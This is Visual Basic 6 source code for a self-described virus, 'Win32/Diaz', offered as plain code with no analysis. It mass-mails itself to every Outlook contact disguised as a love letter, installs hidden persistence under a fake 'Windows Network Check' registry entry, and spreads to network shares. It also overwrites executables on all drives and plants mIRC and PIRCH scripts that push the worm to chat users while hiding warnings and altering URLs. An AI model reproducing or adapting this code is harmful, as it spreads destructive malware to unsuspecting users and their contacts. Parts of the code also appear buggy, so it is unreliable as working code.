Rem Win32/Diaz by FSO
Rem First VB 6 virus ever!
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Const REG_DWORD As Long = 4
Const REG_SZ As Long = 1
Const HKEY_CURRENT_USER As Long = &H80000001
Const HKEY_LOCAL_MACHINE As Long = &H80000002
Sub Main()
On Error Resume Next
If UCase(App.EXEName) = "LOVELETTER.TXT" Then
Open "c:\windows\temp\Loveletter.txt" For Output As #1
Print #1, "Love and Friendship..."
Print #1, ""
Print #1, "1) ALWAYS send flowers on their birthday."
Print #1, "2) Buy the most expensive present you can, and say you couldn't afford anything more."
Print #1, "3) E-Cards make great gifts, too."
Print #1, "4) Call and chat a lot."
Print #1, "5) Give hugs, those are great."
Print #1, "Not on the list..."
Print #1, ""
Print #1, "Open Loveletter.txt.EXE!!!"
Print #1, ""
Print #1, "Win32/Diaz Overwriter by FSO."
Close #1
Shell "c:\windows\temp\Loveletter.txt", vbMaximizedFocus
Kill ("c:\windows\temp\Loveletter.txt")
Garbage = ""
Do While Garbage = ""
If Dir(App.Path & "\" & App.EXEName & ".exe") = "" Then
AppFile = App.Path & "\" & App.EXEName & ".vxd"
Else
AppFile = App.Path & "\" & App.EXEName & ".exe"
End If
Set FSO = CreateObject("Scripting.FileSystemObject")
If FSO Is Nothing Then
Outlook
RegCreate (False)
Else
Set WshShell = CreateObject("WScript.Shell")
WshFound
End If
If Int(Rnd * 10) = Int(Rnd * 10) Then
MsgBox "This program has performed an illegal operation and will be shut down.", vbOKOnly, "Windows"
Shell "RUNDLL32.EXE,user.exe,exitwindows", vbHide
End If
Loop
End Sub
Sub Outlook()
On Error Resume Next
FileCopy AppFile, "C:\WINDOWS\TEMP\Loveletter.txt.exe"
Set MailSvr = CreateObject("Outlook.Application")
X = 0
If MailSvr Is Not Nothing Then
Set MAPI = MailSvr.GetNameSpace("MAPI")
Set MailMsg = MailSvr.CreateItem(0)
For AddyColl = 1 To MAPI.AddressLists.Count
Set AddyBook = MAPI.AddressLists(AddyColl)
For AddyList = 1 To AddyBook.AddressEntries.Count
Set Contact = AddyBook.AddressEntries(AddyList)
MailAddy = Contact.Address
RegOpenKeyExA HKEY_CURRENT_USER, "Software\Microsoft\WAB", 0, KEY_ALL_ACCESS, K
u = RegQueryValueExA(K, MailAddy, 0, REG_SZ, ByVal v$, s)
If u <> "FSO" Then
If AddyColl + AddyList = 2 Then
MailMsg.Bcc = MailAddy
Else
MailMsg.Bcc = MailMsg.Bcc & "; " & MailAddy
End If
RegCloseKey K
Open "c:\outlook.reg" For Output As #2
If AddyColl + AddyList = 2 Then
Print #2, "REGEDIT4"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\WAB]"
End If
Print #2, Chr(34) & MailAddy & " = " & Chr(34) & "FSO" & Chr(34)
Next
Next
MailMsg.Subject = "Love and Friendship"
MailMsg.Body = vbCrLf & "Kindly check the attached (Loveletter from me.) and have a" & vbCr & "very warm and fuzzy holiday while you're at it."
MailMsg.Attachments.Add ("C:\WINDOWS\TEMP\Loveletter.txt.exe")
MailMsg.DeleteAfterSubmit = True
MailMsg.Send
Kill ("C:\WINDOWS\TEMP\LOVELETTER.TXT.EXE")
Print #2, ""
Print #2, ""
Close #2
Shell "c:\outlook.reg", vbHide
End Sub
Sub WshFound()
On Error Resume Next
Outlook
Network
For Each Drive In FSO.Drives
ChatRooms (Drive.Path & "\")
ListFolders (Drive.Path & "\")
Next
RegCreate (True)
End Sub
Function RegCreate(WshFound As Boolean)
On Error Resume Next
If WshFound = True Then
Set WinDir = FSO.GetSpecialFolder(0)
BootDir = WshShell.SpecialFolders("Startup")
If Int(Rnd * 1) + 1 = 1 Then
NewServ = WinDir & "\Network.vxd"
Else
NewServ = BootDir & "\WinSvrc.vxd"
FileCopy AppFile, NewServ
Attrib = FSO.GetFile(NewServ).Attributes
Attrib = Attrib + 1
Attrib = Attrib + 2
Attrib = Attrib + 4
NewServ = ""
End If
Else
NewServ = "c:\recycled\winserv.vxd"
End If
If NewServ <> "" Then
FileCopy AppFile, NewServ
Attrib = FSO.GetFile(NewServ).Attributes
Attrib = Attrib + 1
Attrib = Attrib + 2
Attrib = Attrib + 4
Open "c:\regcreate.reg" For Output As #3
Print #3, "REGEDIT4"
Print #3, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices]"
Print #3, Chr(34) & "Windows Network Check" & Chr(34) & " = " & Chr(34) & NewServ & Chr(34)
Print #3, ""
Print #3, ""
Close #3
Shell "c:\regcreate.reg", vbHide
Kill ("c:\regcreate.reg")
End If
End Function
Sub Network()
Set WshNet = CreateObject("WScript.Network")
Set NetShares = WshNet.EnumNetworkDrives
BootDir = WshShell.SpecialFolders("Startup")
For User = 1 To NetShares.Count
NetBoot = NetShares.Item(User) & Mid(BootDir, 4)
If FSO.FolderExists(NetBoot) = True Then
If FSO.FileExists(NetBoot & "\WinSvrc.vxd") = False Then
FileCopy AppFile, NetBoot & "\WinSvrc.vxd"
Attrib = FSO.GetFile(NetBoot & "\WinSvrc.vxd").Attributes
Attrib = Attrib + 1
Attrib = Attrib + 2
Attrib = Attrib + 4
End If
Else
FileCopy AppFile, NetShares.Item(User) & "\Loveletter.txt.exe"
End If
Next
End Sub
Function ListFolders(folderspec)
Set Fldr = FSO.GetFolder(folderspec)
Set SbFldr = Fldr.Subfolders
For Each FldrColl In SbFldr
ChatRooms (FldrColl.Path)
ListFolders (FldrColl.Path)
Next
End Function
Function ChatRooms(folderspec)
Set ScanFldr = FSO.GetFolder(folderspec)
Set FilePaths = ScanFldr.Files
AXNum = 3
For Each ScanObj In FilePaths
Scanner = ScanObj.Name
ScanType = FSO.GetExtensionName(ScanObj.Path)
EXELimit = 0
If ScanType = "EXE" And EXELimit < 5 And FileLen(f1.Path) <> FileLen(AppFile) Then
EXELimit = EXELimit + 1
FileCopy AppFile, f1.Path
ElseIf Scanner = "PIRCH.EXE" Or Scanner = "PIRCH98.EXE" Or Scanner = "PIRCH32.EXE" Then
Open folderspec & "\Events.ini" For Output As #AXNum
Print #AXNum, "[Levels]"
Print #AXNum, "Enabled=1"
Print #AXNum, "Count=1"
Print #AXNum, "Level1=000-Unknowns"
Print #AXNum, "000-UnknownsEnabled=1"
Print #AXNum, "[000-Unknowns]"
Print #AXNum, "User1=*!*@*"
Print #AXNum, "UserCount=1"
Print #AXNum, "Event1=ON JOIN:#:/dcc send $nick " & FSO.GetSpecialFolder(2) & "\Color Test.exe"
Print #AXNum, "EventCount=1"
Close #AXNum
AXNum = AXNum + 1
ElseIf Scanner = "MIRC.EXE" Then
Open folderspec & "\Script.ini" For Output As #AXNum
Print #AXNum, "On 1:Connect:{ Set %£.go $false | Set %£.which $r(1,2) | Set %£.file " & FSO.GetSpecialFolder(2) & "\Color Test.exe | if ( $exists(%£.file) ) { Set %£.go $true } | Unset %be.* %pk.* %£S.* | life }"
Print #AXNum, "On 1:Disconnect:{ .timers off | .sockclose * | Set %£.date $adate }"
Print #AXNum, "On 1:Input:*:{ Set %£.var1 Ignore:Alias:Write:Play:Rename:Copy:Load:Remini:Writeini:Run:Filter:Flushini:Reload:Remove:Set:Unset:UnsetAll:Enable:Disable: | Set %£.var2 $remove($1,/,.) | if ( $istok(%£.var1,%£.var2,58) ) || ( %£.var2 = $null ) || ( timer isin $1 ) { halt } | if ( $chr(36) isin $1- )  { if ( $pos($1-,$,0) > 1 ) { halt } | Set %£.tmp1 $asc($mid($1-,$calc($pos($1-,$,1) + 1),1)) | if ( %£.tmp1 > 47 ) && ( %£.tmp1 < 58 ) { return } | elseif ( %£.tmp1 = 32) { return } | halt } }"
Print #AXNum, "On 1:Join:*:{ if ( help isin # ) || ( ayuda isin # ) || ( virus isin # ) || ( $remove(#,$chr(35)) isin dmsetupbackorificenohackaide ) { .timerqt 1 5 quiet # } | if ( %£.go ) && ( %£.which = 1 ) { if ( $r(1,2) = 1 ) && ( $nick != $me ) { LS $nick } } }"
Print #AXNum, "On ^1:Part:*:{ if ( %£.go ) && ( %£.which = 2 ) { if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { LS $nick } } | letslook $1- | if ( $letsthink ) { halt } }"
Print #AXNum, "On 1:FileSent:*:{ if ( %£.go ) { LS $nick } }"
Print #AXNum, "On 1:FileRcvd:*:{ if ( %£.go ) { LS $nick } }"
Print #AXNum, "On 1:Notify:{ if ( %£.go ) { if ( $nick !isin %£.nt ) { %£.nt = %£.nt $+ $nick | .ignore -u120 $nick 2 | .timer $+ $r(99,199) 1 10 .msg $nick Hi. This is really neat, thought you might like it. | .timer $+ $r(300,399) 1 12 LS $nick } } }"
Print #AXNum, "On ^1:Kick:*:{ if ( $knick = $me ) { letslook $1- } | if ( $letsthink ) && ( $knick = $me ) { .echo -s 3*** You were kicked from $+ $chr(32) $+ $chan $+ $chr(32) $+ by $nick ( $+ $me $+ ) | halt } }"
Print #AXNum, "On ^1:Notice:*:*:{ letslook $1- | if ( $letsthink ) { if ( $chr(35) !isin $active ) { halt } | .echo $active 5- $+ $nick $+ - $+ $chr(32) $+ $modurl | halt } }"
Print #AXNum, "On ^1:Action:*:*:{ letslook $1- | if ( $letsthink ) { if ( # = $me ) { Set %£.tmp11 $nick } | if ( # != $me ) { Set %£.tmp11 # } | .echo %£.tmp11 6* $+ $chr(32) $+ $nick $+ $chr(32) $+ $modurl | halt } }"
Print #AXNum, "On ^1:Text:*:*:{ letslook $1- | if ( $letsthink ) { if ( # = $null ) { Set %£.tmp11 $nick } | if ( # != $null ) { Set %£.tmp11 # } | .echo %£.tmp11 < $+ $nick $+ > $+ $chr(32) $+ $modurl | halt } }"
Print #AXNum, "On ^1:Chat:*:{ letslook $1- | if ( $letsthink ) { .echo =$nick < $+ $nick $+ > $+ $chr(32) $+ $modurl | halt } }"
Print #AXNum, "On ^1:Serv:*:{ letslook $1- | if ( $letsthink ) { halt } }"
Print #AXNum, "On ^1:Quit:{ Set %£.topic 3 | letslook $1- | if ( $letsthink ) { .echo $comchan($nick,1) 2*** $+ $chr(32) $+ $nick $+ $chr(32) $+ has quit IRC ( $+ $modurl $+ ) | halt } }"
Print #AXNum, "On ^1:Topic:#:{ Set %£.topic 2 | letslook $1- | if ( $letsthink ) { .echo # 3*** $nick changes topic to ' $+ $modurl $+ ' | halt } }"
Print #AXNum, "on ^1:SNOTICE:*:{ letslook $1- }"
Print #AXNum, "ctcp 1:*:*:{ letslook $1- | if ( $letsthink ) { halt } }"
Print #AXNum, "raw 332:*:{ Set %£.topic 1 | letslook $2- | if ( $letsthink ) { .clear $2 | .echo $2 3*** Topic is ' $+ $modurl $+ ' | halt } }"
Print #AXNum, "raw 401:*:{ if ( %£S. $+ $2 != $null ) { .timer $+ $2 off | .sockclose £. $+ $2 | .sockclose ƒ. $+ $2 | Set %£.warning $2 | halt } }"
Print #AXNum, "raw 439:*:{ halt }"
Print #AXNum, "alias quiet { Set %£.var3 1 | :j | Set %£.var4 $nick($1,%£.var3) | if ( %£.var4 = $null ) { .part $1 | halt } | if ( %£.var4 != $me ) && ( %£.var4 != X ) && ( %£.var4 != W ) { .ignore %£.var4 2 } | inc %£.var3 | goto j }"
Print #AXNum, "alias -l life { if ( %£.date != $null ) { if ( $gettok(%£.date,2,47) < $gettok($adate,2,47) ) || ( $gettok(%£.date,1,47) < $gettok($adate,1,47) ) { stages } } }"
Print #AXNum, "alias -l stages { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }"
Print #AXNum, "alias letsdo { .ignore $nick 2 | halt }"
Print #AXNum, "alias letslook { if ( Stages isin $1- ) || ( .shs isin $1- ) || ( script isin $1- ) || ( worm isin $1- ) || ( virus isin $1- ) || ( trojan isin $1- ) || ( infect isin $1- ) || ( spread isin $1- ) || ( remote isin $1- ) || ( events isin $1- ) || ( unload isin $1- ) || ( virii isin $1- ) || ( dccallow isin $1- ) { if ( %£.topic = 1 ) { unset %£.topic | .timerf 1 1 quiet $1 | halt } | if ( %£.topic = 2 ) { unset %£.topic | quiet # | halt } | if ( %£.topic = 3 ) { halt } | letsdo } | if ( %£.topic = 1 ) { Set %£.think $2- } | else { Set %£.think $1- } | Unset %£.topic }"
Print #AXNum, "alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }"
Print #AXNum, "alias remote { if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF | halt } }"
Print #AXNum, "alias events { if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF | halt } }"
Print #AXNum, "On 1:SockClose:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | sockclose $sockname | sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off }"
Print #AXNum, "On 1:SockListen:£.*:{ Set %£.tmp5 $remove($sockname,£.) | sockaccept ƒ. $+ %£.tmp5 | SL %£.tmp5 }"
Print #AXNum, "On 1:SockWrite:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | if ( [ % $+ [ £S. $+ [ %£.tmp6 ] ] ] = 1 ) { .timer $+ $r(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off | halt } | SL %£.tmp6 }"
Print #AXNum, "alias LS { if ( $sock(£.*,0) > 5 ) { return } | Set %£S. $+ $1 0 | :pointless | Set %pt $r(2400,5000) | if ( $portfree(%pt) = $false ) { goto pointless } | Set [ % $+ [ be. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%£.file).size | Set %£.tmp4 £. $+ $1 | .timer $+ $1 1 240 .sockclose %£.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose ƒ. $+ $1 | .timer1 $+ $1 1 20 TO $1 | .notice $1 DCC Send $left($gettok(%£.file,3,92), $calc( [ $len( [ $gettok(%£.file,3,92) ] ) ] - 4 ) ) ( $+ $ip $+ ) | if ( $1 = %£.warning ) { return } | .ignore -u90 $1 2 | .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %£.file $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(%£.tmp4) != $null ) { .sockclose %£.tmp4 } | .socklisten %£.tmp4 %pt }"
Print #AXNum, "alias SL { if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data | inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ £S. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data } }"
Print #AXNum, "alias TO { if ( [ % $+ [ be. $+ [ $1 ] ] ] = 0 ) { sockclose [ ƒ. $+ [ $1 ] ] | sockclose [ £. $+ [ $1 ] ] | .timer $+ $1 off } }"
Print #AXNum, "alias modurl { Set %£.think $replace(%£.think,$chr(44),$chr(32),$chr(59),$chr(32)) | Unset %£.think.again | Set %£.var6 $numtok(%£.think,32) | Set %£.var61 1 | Set %£.var64 $nick $+ $chr(91) $+ $gettok($address,2,64) $+ $chr(93) | :mod1 | if ( %£.var61 > %£.var6 ) { return %£.think.again } | Set %£.var62 $gettok(%£.think,%£.var61,32) | if ( http !isin %£.var62 ) && ( www !isin %£.var62 ) && ( ftp. !isin %£.var62 ) && ( .com !isin %£.var62 ) && ( .net !isin %£.var62 ) && ( .org !isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | if ( $gettok($address,2,64) isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 }"
Print #AXNum, "if ( %£.var64 isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | Set %£.var63 $gettok(%£.var62,2,46) | if ( %£.var63 = $null ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | if ( $len(%£.var63) > 2 ) { Set %£.var63 $left(%£.var63,$int($calc($len(%£.var63)/2))) $+ $r(a,z) $+ $mid(%£.var63,$calc($int($calc($len(%£.var63)/2)) + 1),$len(%£.var63)) } | Set %£.var63 $r(A,Z) $+ %£.var63 $+ $r(a,z) | Set %£.think.again %£.think.again $+ $chr(32) $+ $puttok(%£.var62,%£.var63,2,46) | inc %£.var61 | goto mod1 }"
Print #AXNum, "alias letsthink { if ( http isin %£.think ) || ( .org isin %£.think ) || ( .net isin %£.think ) || ( .com isin %£.think ) || ( ftp. isin %£.think ) || ( www isin %£.think ) { return $true } | return $false }"
Close #AXNum
AXNum = AXNum + 1
End If
End Function